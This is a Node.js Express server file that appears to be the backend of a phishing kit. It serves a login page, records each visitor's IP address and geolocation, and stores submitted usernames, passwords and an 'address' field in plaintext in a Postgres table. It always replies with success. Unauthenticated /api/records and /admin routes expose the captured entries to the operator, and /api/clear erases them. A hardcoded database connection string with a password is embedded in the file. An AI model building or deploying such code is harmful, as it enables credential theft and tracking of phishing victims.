const express = require('express');
const path = require('path');
const { Pool } = require('pg');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));


// Supabase Connection
const pool = new Pool({
    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
    ssl: { rejectUnauthorized: false }
});

pool.query(`CREATE TABLE IF NOT EXISTS records (
    id SERIAL PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    location TEXT,
    timestamp TEXT
)`);

async function getLocation(ip) {
    if (!ip || ip === 'Unknown') return 'Unknown';
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        if (data && data.country_name) {
            return `${data.city || ''}, ${data.region || ''}, ${data.country_name}`.trim();
        }
    } catch (e) {}
    return 'Unknown Location';
}

async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    const location = await getLocation(ip);

    pool.query(
        "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
        [type, username, password, address, ip, location, timestamp]
    );
    console.log(`✅ SAVED: ${type} | IP: ${ip} | Location: ${location}`);
}

// Record Page Visit Immediately
app.get('/', async (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    await saveRecord('Page Visit', null, null, null, ip);
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', async (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    await saveRecord('Page Visit', null, null, null, ip);
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', async (req, res) => {
    const { username, password, address } = req.body;
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    await saveRecord('Login Attempt', username, password, address, ip);
    res.json({ success: true });
});

app.get('/api/records', async (req, res) => {
    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
    res.json(result.rows);
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/api/clear', async (req, res) => {
    await pool.query("DELETE FROM records");
    res.json({ message: 'Cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running`);
});